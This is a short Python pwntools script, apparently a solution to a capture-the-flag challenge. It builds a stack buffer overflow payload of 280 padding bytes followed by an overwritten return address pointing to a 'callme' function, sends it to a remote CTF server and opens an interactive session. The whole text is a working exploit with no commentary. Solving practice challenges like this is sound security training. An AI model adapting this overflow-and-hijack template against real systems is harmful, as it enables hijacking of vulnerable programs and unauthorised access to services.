from pwn import *

callme=0x400606

payload = b'a'*280
payload += p64(callme)

r = remote("ctf.j0n9hyun.xyz", 3004)

r.sendline(payload)

r.interactive()